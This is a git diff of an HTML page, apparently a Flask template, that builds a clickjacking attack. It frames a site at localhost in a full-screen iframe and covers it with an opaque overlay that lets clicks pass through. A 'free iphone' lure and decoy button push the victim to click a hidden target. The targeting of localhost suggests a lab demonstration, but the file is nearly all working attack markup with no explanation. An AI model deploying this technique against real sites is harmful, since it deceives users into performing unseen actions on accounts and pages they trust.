@@ -7,30 +7,65 @@
     <title>CLICK-JACKED</title>
 
     <style>
-        *{
+        * {
             margin: 0;
             padding: 0;
         }
 
-        iframe{
+        iframe {
             position: absolute;
             width: 100%;
             height: 100vh;
         }
 
-        .over{
+        .over {
             position: absolute;
+            background-color: black;
+            color: black;
+            /* opacity: 0.5; */
             top: 0;
             z-index: 2;
             width: 100%;
             height: 100vh;
+            pointer-events: none;
+        }
+        .win{
+            background-color: rgb(255, 255, 255);
+            position: absolute;
+            top: 2%;
+            right: 8%;
+            width: 200px;
+            padding: 10px;
+            border-radius: 10px;
+            color: black;
+            pointer-events: none;
+        }
+        .title{
+            padding-top: 20px;
+            color: white;
+            text-align: center;
+        }
+        .flex{
+            display: flex;
+            padding: 20px;
+            justify-content: center;
         }
     </style>
 </head>
 
 <body>
-   <iframe src="http://localhost/" frameborder="0"></iframe>
-    <a href="http://localhost:5000/" class="over"></a>
+    <iframe src="http://localhost/" frameborder="0"></iframe>
+
+    <div class="over">
+        <div class="title">
+            Do you want to get a free iphone? Click the button!
+        </div>
+
+        <div class="flex"> <img  src="{{url_for('static', filename='iphone.png')}}" width="500px" alt=""></div>
+
+        <button class="win">Get a free iphone!</button>
+    </div>
+
 </body>
 
 </html>
